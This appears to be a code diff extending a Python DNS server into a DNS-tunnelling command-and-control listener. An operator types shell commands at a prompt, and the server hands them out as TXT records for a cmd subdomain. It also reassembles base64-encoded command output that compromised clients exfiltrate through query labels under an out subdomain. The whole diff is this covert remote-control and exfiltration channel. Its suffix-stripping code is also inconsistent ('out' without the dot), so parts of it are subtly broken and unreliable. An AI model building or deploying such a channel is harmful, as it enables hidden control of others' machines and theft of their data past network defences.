@@ -2,22 +2,95 @@ from dnslib import RR
 from dnslib.server import DNSServer, BaseResolver, DNSLogger
 import argparse
 import queue
+import struct
+import base64
 
-qCommands = queue.Queue()
+domain = "example.com"
+q_commands = queue.Queue()
 
 
 class TunnelResolver(BaseResolver):
+    def __init__(self):
+        self.__is_receiving = False
+        self.__seq_num = -1
+        self.__buffer = {}
+
     def resolve(self, request, handler):
         reply = request.reply()
         qname = request.q.qname
-        try:
-            command_txt = qCommands.get(block=False, timeout=None)
-        except queue.Empty:
-            command_txt = ""
-
-        reply.add_answer(*RR.fromZone("{} 60 IN TXT \"{}\"".format(qname, command_txt)))
+        cc_record = "cmd." + domain + "."
+        qstr = str(qname)
+        if qstr == cc_record:
+            try:
+                command_txt = q_commands.get(block=False, timeout=None)
+            except queue.Empty:
+                command_txt = ""
+            reply.add_answer(*RR.fromZone("{} 60 IN TXT \"{}\"".format(qname, command_txt)))
+        elif ("out." + domain + ".") in qstr:
+            self.__parse_out(qstr)
         return reply
 
+    """
+    Parse the response for the client
+    They are blocks of 32 bytes per level with a maximum of 3 level. The data is encoded in 
+    the response using base64. The two first bytes are used as the seq number. The Msb bit 
+    for the first byte is used to indicate that this is the last packet for the response.
+    """
+    def __parse_out(self, request):
+        self.__is_receiving = True
+
+        top_level = "out" + domain + "."
+        data_str = request[:-(len(top_level)+1)]
+        data_block = list(filter(None, data_str.split(".")))
+
+        seq_num = 0
+        correct_order = False
+        response_buffer = []
+        for i, block in enumerate(data_block):
+            # Base64 decode
+            block_decoded = base64.b64decode(block)
+            if i == 0:
+                last_packet, seq_num, data = self.__parse_first_block(block_decoded)
+                if last_packet:
+                    self.__is_receiving = False
+
+                if self.__seq_num == (seq_num - 1):
+                    # The order is expected
+                    correct_order = True
+                self.__seq_num = seq_num
+            else:
+                data = block_decoded
+            response_buffer.append(data)
+
+        response = b''.join(response_buffer)
+        self.__buffer[seq_num] = response
+
+        if not self.__is_receiving:
+            self.__flush()
+
+    @staticmethod
+    def __parse_first_block(block):
+        data = block[2:]
+        control_byte = block[0]
+
+        seq_num_byte = bytearray(block[0:2])
+        seq_num_byte[0] &= 0x7F
+        seq_num = struct.unpack(">H", seq_num_byte)[0]
+
+        return bool(control_byte & 0x80), seq_num, data
+
+    def __flush(self):
+        missing_packet = False
+        for i in range(self.__seq_num+1):
+            if i in self.__buffer:
+                print(self.__buffer[i].decode("ascii"), end="")
+            else:
+                missing_packet = True
+        print()
+
+        if missing_packet:
+            print("[!] Some packets are missing!")
+        self.__buffer = {}
 
 p = argparse.ArgumentParser(description="Fixed DNS Resolver")
 p.add_argument("--port", "-p", type=int, default=53,
@@ -62,4 +135,4 @@ if args.tcp:
 while udp_server.isAlive():
     command = input("$ ")
     if len(command) <= 255:
-        qCommands.put(command)
+        q_commands.put(command)
